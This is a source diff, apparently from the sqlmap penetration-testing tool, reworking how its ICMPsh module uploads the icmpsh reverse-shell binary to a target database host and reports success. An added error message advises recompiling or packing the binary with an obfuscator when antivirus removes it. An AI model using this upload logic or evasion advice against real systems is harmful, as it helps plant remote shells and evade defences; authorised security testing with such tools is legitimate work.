@@ -18,7 +18,7 @@ from lib.core.common import readInput
 from lib.core.data import conf
 from lib.core.data import logger
 from lib.core.data import paths
-
+from lib.core.exception import SqlmapFilePathException
 
 class ICMPsh:
     """
@@ -67,19 +67,30 @@ class ICMPsh:
         self._randStr = randomStr(lowercase=True)
         self._icmpslaveRemoteBase = "tmpi%s.exe" % self._randStr
 
-        if web:
-            self._icmpslaveRemote = "%s/%s" % (self.webDirectory, self._icmpslaveRemoteBase)
-        else:
-            self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
-
+        self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
         self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))
 
         logger.info("uploading icmpsh slave to '%s'" % self._icmpslaveRemote)
 
         if web:
-            self.webUpload(self._icmpslaveRemote, self.webDirectory, filepath=self._icmpslave)
+            written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)
         else:
-            self.writeFile(self._icmpslave, self._icmpslaveRemote, "binary")
+            written = self.writeFile(self._icmpslave, self._icmpslaveRemote, "binary", forceCheck=True)
+
+        if written is not True:
+            errMsg = "there has been a problem uploading icmpsh, it "
+            errMsg += "looks like the binary file has not been written "
+            errMsg += "on the database underlying file system or an AV has "
+            errMsg += "flagged it as malicious and removed it. In such a case "
+            errMsg += "it is recommended to recompile icmpsh with slight "
+            errMsg += "modification to the source code or pack it with an "
+            errMsg += "obfuscator software"
+            logger.error(errMsg)
+
+            return False
+        else:
+            logger.info("icmpsh successfully uploaded")
+            return True
 
     def icmpPwn(self):
         ICMPsh._prepareIngredients(self)
